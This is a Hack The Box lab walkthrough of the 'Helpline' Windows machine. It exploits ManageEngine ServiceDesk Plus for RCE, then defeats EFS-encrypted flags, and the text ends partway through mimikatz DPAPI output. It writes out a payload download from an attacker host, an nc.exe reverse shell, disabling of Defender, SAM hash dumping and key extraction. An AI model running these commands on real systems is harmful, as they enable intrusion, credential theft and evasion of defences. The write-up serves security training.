---
layout: post
title: Hack The Box - Helpline
categories: hack-the-box
tags: [Windows, Web, RCE, Cryptography, Windows Exploitation]
image: /hackthebox/helpline/0.png
---

<hr>
### Quick Summary
#### Hey guys today Helpline retired and here's my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as `nt authority/system` which means that I technically rooted the box. But the flags were `EFS` encrypted so I had to find a way to read them. It's a Windows box and its ip is `10.10.10.152`, I added it to `/etc/hosts` as `helpline.htb`. Let's jump right in !
![](/images/hackthebox/helpline/0.png)
<hr>
### Nmap
#### As always we will start with `nmap` to scan for open ports and services :
```
# Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb
Nmap scan report for helpline.htb (10.10.10.132)
Host is up (0.10s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy    -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:43 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:45 GMT
|     Connection: close
|     Server: -
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <script language='JavaScript' type="text/javascript" src='/scripts/Login.js?9309'></script>
|     <script language='JavaScript' type="text/javascript" src='/scripts/jquery-1.8.3.min.js'></script>
|     <link href="/style/loginstyle.css?9309" type="text/css" rel="stylesheet"/>
|     <link href="/style/new-classes.css?9309" type="text/css" rel="stylesheet">
|     <link href="/style/new-classes-sdp.css?9309" type="text/css" rel="stylesheet">
|_    <link href="/style/conflict-fix.css?9309" type="text/css" rel="stylesheet">
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: -
|_http-title: ManageEngine ServiceDesk Plus
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2328,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8
SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\
SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\
SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding
SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20-\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<
SF:meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\n\n\n\
SF:r\n\n\x20\x20\x20\x20<script\x20language='JavaScript'\x20type=\"text/ja
SF:vascript\"\x20src='/scripts/Login\.js\?9309'></script>\n\x20\x20\x20\x2
SF:0<script\x20language='JavaScript'\x20type=\"text/javascript\"\x20src='/
SF:scripts/jquery-1\.8\.3\.min\.js'></script>\n\x20\x20\x20\x20\n\x20\x20\
SF:x20\x20<link\x20href=\"/style/loginstyle\.css\?9309\"\x20type=\"text/cs
SF:s\"\x20rel=\"stylesheet\"/>\n\x20\x20\x20\x20<link\x20href=\"/style/new
SF:-classes\.css\?9309\"\x20type=\"text/css\"\x20rel=\"stylesheet\">\n\x20
SF:\x20\x20\x20<link\x20href=\"/style/new-classes-sdp\.css\?9309\"\x20type
SF:=\"text/css\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link\x20href=\"/
SF:style/conflict-fix\.css\?9309\"\x20type=\"text/css\"\x20rel=\"styleshee
SF:t\">")%r(HTTPOptions,2328,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSE
SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac
SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0
SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc
SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:>\n<head>\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge
SF:\">\n\n\n\n\r\n\n\x20\x20\x20\x20<script\x20language='JavaScript'\x20ty
SF:pe=\"text/javascript\"\x20src='/scripts/Login\.js\?9309'></script>\n\x2
SF:0\x20\x20\x20<script\x20language='JavaScript'\x20type=\"text/javascript
SF:\"\x20src='/scripts/jquery-1\.8\.3\.min\.js'></script>\n\x20\x20\x20\x2
SF:0\n\x20\x20\x20\x20<link\x20href=\"/style/loginstyle\.css\?9309\"\x20ty
SF:pe=\"text/css\"\x20rel=\"stylesheet\"/>\n\x20\x20\x20\x20<link\x20href=
SF:\"/style/new-classes\.css\?9309\"\x20type=\"text/css\"\x20rel=\"stylesh
SF:eet\">\n\x20\x20\x20\x20<link\x20href=\"/style/new-classes-sdp\.css\?93
SF:09\"\x20type=\"text/css\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link
SF:\x20href=\"/style/conflict-fix\.css\?9309\"\x20type=\"text/css\"\x20rel
SF:=\"stylesheet\">");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -59m59s, deviation: 0s, median: -59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-15 19:57:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 15 20:58:04 2019 -- 1 IP address (1 host up) scanned in 162.71 seconds

```
#### We got `http` on port 8080 and `smb`. I tried to list `smb` shares but I couldn't authenticate anonymously :
```
root@kali:~/Desktop/HTB/boxes/helpline# smbclient --list //helpline.htb/ -U ""
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```
<br>
<hr>
### HTTP Initial Enumeration, Administrative Access
#### On the `http` port there was an application called `ManageEngine ServiceDesk Plus`.
![](/images/hackthebox/helpline/1.png)
#### I tried some common credentials like `admin:admin` and `guest:guest` which actually worked :
![](/images/hackthebox/helpline/2.png)
<br>
<br>
![](/images/hackthebox/helpline/3.png)
#### But as `guest` my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this [authentication bypass vulnerability](https://www.exploit-db.com/exploits/42037). However to exploit it I needed a valid username :
![](/images/hackthebox/helpline/4.png)
<br>
<br>
![](/images/hackthebox/helpline/5.png)
<br>
<br>
![](/images/hackthebox/helpline/6.png)
#### luckily there was another [user enumeration vulnerability](https://www.exploit-db.com/exploits/35891) which I could exploit as `guest`. 
![](/images/hackthebox/helpline/7.png)
<br>
<br>
![](/images/hackthebox/helpline/8.png)
#### Before using `wfuzz` with a long wordlist I tried some common usernames first, `administrator` was an existing user :
![](/images/hackthebox/helpline/9.png)
#### To exploit the authentication bypass vulnerability we have to login as `guest`, then navigate to `/mc` and logout. After that we will login as `administrator`  by using `administrator` as username and password then return to the index page again and we will be redirected to the dashboard as `administrator`.
![](/images/hackthebox/helpline/10.png)
<br>
<br>
![](/images/hackthebox/helpline/11.png)
<br>
<br>
![](/images/hackthebox/helpline/12.png)
<br>
<br>
![](/images/hackthebox/helpline/13.gif)
<br>
<br>
![](/images/hackthebox/helpline/14.png)
#### There is also a published [exploit](https://www.exploit-db.com/exploits/46659) that does the same thing automatically :
![](/images/hackthebox/helpline/15.png)
<hr>
### RCE
#### I checked the `Admin` section and `Custom Triggers` under `Helpdesk Customizer` caught my attention.
![](/images/hackthebox/helpline/16.png)
<br>
<br>
![](/images/hackthebox/helpline/17.png)
#### Description says : "You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both"
#### I ran a python `http` server to host `nc.exe` then I created a trigger that executes : 
```
powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
```
#### When a request is created (it must has the word `test` in the subject).
![](/images/hackthebox/helpline/18.png)
<br>
<br>
![](/images/hackthebox/helpline/19.png)
#### Last thing to do is to create a request that runs the trigger :
![](/images/hackthebox/helpline/20.png)
<br>
<br>
![](/images/hackthebox/helpline/21.png)
#### I edited the trigger and made it execute :
```
C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337
```
#### Then I created another request and got a reverse shell as `nt authority\system` :
![](/images/hackthebox/helpline/22.png)
<hr>
### Encrypted Flags
#### Although I was `system` I couldn't read the flags :
```
E:\ManageEngine\ServiceDesk\integration\custom_scripts>c:                         
c:              
C:\>cd Users                  
cd Users 
C:\Users>cd Administrator           
cd Administrator
C:\Users\Administrator>cd Desktop                 
cd Desktop
C:\Users\Administrator\Desktop>type root.txt                           
type root.txt
Access is denied.
```

```
C:\Users>cd tolu
cd tolu

C:\Users\tolu>cd Desktop
cd Desktop

C:\Users\tolu\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\tolu\Desktop

12/29/2018  10:21 PM    <DIR>          .
12/29/2018  10:21 PM    <DIR>          ..
12/21/2018  12:12 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   5,851,750,400 bytes free

C:\Users\tolu\Desktop>type user.txt
type user.txt
Access is denied.
```
#### That's because the flags are `EFS` encrypted :
```
C:\Users\Administrator\Desktop>cipher /c root.txt
cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop>cipher /c ../../tolu/Desktop/user.txt
cipher /c ../../tolu/Desktop/user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.


C:\Users\Administrator\Desktop>
```
#### To decrypt them we need `Administrator`'s password for `root.txt` and `tolu`'s password for `user.txt`. First time I solved this box I got the root flag first as it was easier but for the write-up I'll do user flag first.
<br>
<hr>
### user.txt
#### Since we need passwords, first thing I did was to put [`mimikatz`](https://github.com/gentilkiwi/mimikatz) on the box and dump the password hashes.
#### But before that I had to disable :
```
PS C:\Users\Administrator\Desktop> Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Users\Administrator\Desktop> 
```

```
PS C:\windows\system32\spool\drivers\color> Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
Invoke-WebRequest http://10.10.xx.xx/mimikatz.exe -OutFile mimikatz.exe
PS C:\windows\system32\spool\drivers\color> dir
dir


    Directory: C:\windows\system32\spool\drivers\color
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/15/2018   8:12 AM           1058 D50.camp
-a----        9/15/2018   8:12 AM           1079 D65.camp
-a----        9/15/2018   8:12 AM            797 Graphics.gmmp
-a----        9/15/2018   8:12 AM            838 MediaSim.gmmp
-a----        8/16/2019   1:24 PM        1006744 mimikatz.exe
-a----        8/16/2019   1:47 PM          38616 nc.exe
-a----        9/15/2018   8:12 AM            786 Photo.gmmp
-a----        9/15/2018   8:12 AM            822 Proofing.gmmp
-a----        9/15/2018   8:12 AM         218103 RSWOP.icm
-a----        9/15/2018   8:12 AM           3144 sRGB Color Space Profile.icm
-a----        9/15/2018   8:12 AM          17155 wscRGB.cdmp
-a----        9/15/2018   8:12 AM           1578 wsRGB.cdmp

PS C:\windows\system32\spool\drivers\color> 
```

```
mimikatz # lsadump::sam
Domain : HELPLINE
SysKey : f684313986dcdab719c2950661809893
Local SID : S-1-5-21-3107372852-1132949149-763516304

SAMKey : 9db624e549009762ee47528b9aa6ed34

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d5312b245d641b3fae0d07493a022622

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 52a344a6229f7bfa074d3052023f0b41

RID  : 000003e8 (1000)
User : alice
  Hash NTLM: 998a9de69e883618e987080249d20253

RID  : 000003ef (1007)
User : zachary
  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282

RID  : 000003f1 (1009)
User : leo
  Hash NTLM: 60b05a66232e2eb067b973c889b615dd

RID  : 000003f2 (1010)
User : niels
  Hash NTLM: 35a9de42e66dcdd5d512a796d03aef50

RID  : 000003f3 (1011)
User : tolu
  Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
```
#### The only crackable hash was `zachary`'s :
![](/images/hackthebox/helpline/23.png)
#### But what can we do with `zachary` ?
```
PS C:\windows\system32\spool\drivers\color> net users zachary
net users zachary
User name                    zachary
Full Name                    zachary
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/21/2018 10:25:34 PM
Password expires             Never
Password changeable          12/21/2018 10:25:34 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/16/2019 1:37:32 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Users
Global Group memberships     *None
The command completed successfully.
```
#### `zachary` is a member of a local group called `Event Log Readers`, maybe there is something in the event log, I queried the event log with `wevtutil` and saved the output in a file :
```
C:\Windows\System32\spool\drivers\color>wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt                                                                        
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt

C:\Windows\System32\spool\drivers\color>
```
#### The output was a very long one so I searched for interesting stuff like usernames, by searching  for `tolu` I got this `net use` command which had `tolu's` password :
```
C:\Windows\System32\spool\drivers\color>type eventlog.txt | findstr tolu                                                                   
type eventlog.txt | findstr tolu                                                                                                           
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                                       
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu                                                                                   
        Account Name:           tolu
    ----------------
     Removed Output
    ----------------
Process Command Line:   "C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99                                                                                           
        Account Name:           tolu
Logon Account:  tolu
        Account Name:           tolu
        Process Command Line:   "C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99                                                                                     
        Account Name:           tolu
        Account Name:           tolu

```
#### `tolu : !zaq1234567890pl!99`
#### `tolu` is in the `Remote Management Users` local group :
```
C:\Windows\System32\spool\drivers\color>net users tolu
net users tolu
User name                    tolu
Full Name                    tolu
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/28/2018 10:52:52 PM
Password expires             Never
Password changeable          12/28/2018 10:52:52 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/29/2018 10:20:44 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```
#### And `winrm`'s port is open :
![](/images/hackthebox/helpline/24.png)
#### So I thought of authenticating as `tolu` to read the flag (I used [`evilwinrm`](https://github.com/Hackplayers/evil-winrm))
![](/images/hackthebox/helpline/25.png)
#### But I still couldn't read the flag ...
```
*Evil-WinRM* PS C:\Users\tolu\Desktop> type user.txt
Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
At line:1 char:1
+ type user.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
#### I found this [guide](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) to decrypt `EFS` files with `mimikatz`, by following it I was able to decrypt the user flag.
#### We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :
```
mimikatz # crypto::system /file:"C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29" /export                                                                               
* File: 'C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29'                                                                                      
[0045/1] BACKED_UP_PROP_ID                                                                     00                                                                                         [0002/1] KEY_PROV_INFO_PROP_ID                                                                 Provider info:                                                                                     Key Container  : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d                                       Provider       : Microsoft Enhanced Cryptographic Provider v1.0                             Provider type  : RSA_FULL (1)                                                               Type           : AT_KEYEXCHANGE (0x00000001)                                                 Flags          : 00000000                                                                   Param (todo)   : 00000000 / 00000000                                                 [0003/1] SHA1_HASH_PROP_ID
  91ef5d08d1f7c60aa0e4cee73e050639a6692f29
[0020/1] cert_file_element
  Data:
308202f9308201e1a0030201020210560e4d2b13840a9f4ef8246c32c1950f300d06092a864886f70d0101050500300f310d300b06035504031304746f6c753020170d3138313232393231323133335a180f32313138313230353231323133335a300f310d3
00b06035504031304746f6c7530820122300d06092a864886f70d01010105000382010f003082010a0282010100b661bbc3191aed3031d754ceee0cef50462a746656b973a74bed822fa31d44b8eb9ce1f165ef9f9691863b18694d0d72ddbb4ed40bc91021ef9ec7dc
977242dbab9d9124e548d7f71bfa191de5d0fd1d23de24a10958c5821adb7b89b350e5c3da17cdffdf828659dd8732f55bc7bd4f7e7c167f3f054520c34a4b280dbe0e86faae45082eeed8422549a49134b398351563c62dab70cfa3bb66d9cf07e749f3c2bc9a554a8
b2bcda9559d3f42b7b1fed755c519f26243756363efd93cae3f71aa813af0757d231a43daae5b3dc4303b330833e2db7cad6af45ab9c2b756c2de5af4f250df1c58e35bdfb3ccbc6c3be0db973faf27314413375d7b1c40dbc3310203010001a34f304d30150603551d
25040e300c060a2b0601040182370a030430290603551d1104223020a01e060a2b060104018237140203a0100c0e746f6c754048454c504c494e450030090603551d1304023000300d06092a864886f70d010105050003820101001054e49d105efb13f699ec26dd8f2
828eff46966b8b3623dafb132b287e4a4c870261bb6bec2acf8a8a648aead2b8c9daeb366d6096889ea23cba08d71b78aa9c09e92218c6bbd5b17e67910c551f0f452963d730f5b90c6be10048c1234087bcd1cdcc0f17adae55452f7f0b495414f54de59ff39f513e8
1aae5c1aa6e54beb8561aa5795cb59dddbfe528b9020d1f4d1aab1842eafbc0c0d92c75aa42ab1dd278262676a2fd5a39b526544d37cf59c2647db5efb743c78fb744be0cf41b2512c7f42dbb2949cbe359aca36b17670247b49b12c27119f7d358ca38e70c3ccebd13
c5bccc7236ae09646af07077233b49a5615cb8be05b642e09de595c89dfb9
  Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der


mimikatz # dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85"

**KEY (capi)**

  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                         
  pExPrivateKey      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf0307
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330$
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899$
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596                                                         

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800                                                         


mimikatz # dpapi::masterkey /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017" /password:!zaq1234567890pl!99                
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 80ba00dd649b0237d847b3c30d155a36
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
